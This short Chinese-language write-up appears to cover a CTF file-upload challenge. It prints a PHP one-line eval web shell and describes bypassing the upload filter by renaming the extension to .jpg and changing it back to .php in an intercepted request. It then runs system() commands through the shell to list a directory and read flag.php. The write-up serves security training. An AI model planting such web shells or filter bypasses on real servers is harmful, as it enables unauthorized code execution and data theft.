![image-20250403181321403](./assets/image-20250403181321403.png)

php一句话木马

```
<?php @eval($_POST[ra1n3]);?>
```

上传php文件失败



修改php后缀名为jpg

抓包上传

![image-20250403181423270](./assets/image-20250403181423270.png)

![image-20250403181430536](./assets/image-20250403181430536.png)



再将文件后缀名改为php

![image-20250403181447136](./assets/image-20250403181447136.png)



成功上传

![image-20250403181454080](./assets/image-20250403181454080.png)



查看上一级目录内容

```
ra1n3=system("ls ../");
```

![image-20250403181525368](./assets/image-20250403181525368.png)



```
ra1n3=system("tac ../flag.php");
```

![image-20250403181614368](./assets/image-20250403181614368.png)